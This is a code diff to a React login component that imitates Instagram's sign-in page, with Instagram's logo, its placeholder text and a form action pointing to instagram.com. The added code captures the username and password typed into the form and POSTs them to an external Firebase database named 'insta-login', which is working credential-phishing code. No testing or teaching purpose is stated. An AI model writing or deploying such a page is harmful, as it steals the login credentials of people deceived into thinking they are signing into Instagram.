@@ -1,20 +1,46 @@
-import React from 'react'
+import React, { useState } from 'react'
 import Image from './assets/instagram.png'
 import Icon from './assets/icon.svg'
 import Google from './assets/google.png'
 import Microsoft from './assets/microsoft.png'
 
 const Login = () => {
-
+  let[userName, setUserName]= useState('');
+  let[password, setPassword]= useState('');
     let submit=(event)=>{
         event.preventDefault();
-        let username= event.target.elements[0].value;
-        let password= event.target.elements[1].value;
-        console.log("Username: ", username);
-        console.log("Password: ", password);
-        
-        
+
+        console.log(userName);
+        console.log(password);
+        firebase();
+      };
+      let Handleuser=(e)=>{
+        setUserName(e.target.value);
       }
+      let Handlepassword=(e)=>{
+        setPassword(e.target.value);
+      }
+      
+
+      // FIREBASE SETUP OPEN
+
+    let firebase= async()=>{
+      let res= await fetch('https://insta-login-d611c-default-rtdb.firebaseio.com/userData.json',
+        {
+          method: 'POST',
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            userName,
+            password
+          })
+        }
+      );
+    };
+
+          // FIREBASE SETUP END
+
       return (
         < div className='bg-black w-[100%] h-[100vh]'>
         <div className='flex justify-center'>
@@ -23,11 +49,11 @@ const Login = () => {
             <div className='mx-15 mb-9'><img src={Image} alt="" className='w-[200px] h-auto'/></div>
     
             <form action="https://www.instagram.com/" onSubmit={submit}>
-              <input type="text" placeholder='Phone number, username, or email' className='w-[268px] h-[38px] border-[0.5px] outline-none px-1 text-[14px] text-[white] rounded-[3px] border-[#5f5d5d]'/>
+              <input type="text" placeholder='Phone number, username, or email' className='w-[268px] h-[38px] border-[0.5px] outline-none px-1 text-[14px] text-[white] rounded-[3px] border-[#5f5d5d]' onChange={Handleuser}/>
     
-              <input type="password" placeholder='Password' className='w-[268px] h-[38px] border-1 outline-none mt-2 px-1 text-[14px] text-gray-200 rounded-[3px] border-[#5f5d5d]'/>
+              <input type="password" placeholder='Password' className='w-[268px] h-[38px] border-1 outline-none mt-2 px-1 text-[14px] text-gray-200 rounded-[3px] border-[#5f5d5d]' onChange={Handlepassword} required/>
     
-              <button className='w-[268px] h-[32px] bg-blue-500 mt-1.5 rounded-[5px] text-white font-medium cursor-pointer outline-none'>Log in</button>
+              <button className='w-[268px] h-[32px] bg-blue-500 mt-1.5 rounded-[5px] text-white font-medium cursor-pointer outline-none' >Log in</button>
     
             </form>
             <div className='mt-6'><p className='text-[white] text-[13px]'>OR</p></div>
